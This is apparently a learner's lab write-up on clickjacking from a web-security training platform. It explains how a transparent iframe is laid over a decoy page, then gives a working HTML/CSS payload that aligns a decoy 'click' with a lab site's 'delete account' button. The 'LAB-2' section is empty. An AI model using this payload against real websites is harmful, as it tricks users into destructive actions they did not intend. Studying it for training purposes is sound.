# Click jacking

Clickjacking is an interface-based attack.
 
**<iframe>**
helps to place a site on another site. basically it will display one site on another.

attacker user this label and places a real website on top of a decoy website which contain some duplicate buttons(just structure without
ability to click). places a real website on top this decoy website aligning the buttons on the real websites with the buttons fake decoy
site.

the real website's transparency is almost 0 which makes it invisible to the user and he will click the buttons that the attacker planned.



## LAB-1

we have to make a decoy website aligning the delete key exactly for the ```click```  to the main site's ```delete account```. and make the main site transparent.

***payload***
```
<head>
	<style>
		#target_website {
			position:relative;
			width:700px;
			height:700px;
			opacity: 0.1;
			z-index:2;
                        border: none;
			}
		#decoy_website {
			position:absolute;
                        left: 100px;
                        top: 560px;
			                  width:700;
                        height:700;
			z-index:1;
			}
	</style>
</head>
<body>
	<div id="decoy_website">
	click
	</div>
	<iframe id="target_website" src="https://0acf002904a9e07787f7d367007a006d.web-security-academy.net/my-account">
	</iframe>
</body>
```

i)  made the <div> element of decoy element and the target site of same size so they both get alligned perfectly.
ii) then changed the position of the text "click" to the match the decoy site's delete account position.


## LAB-2
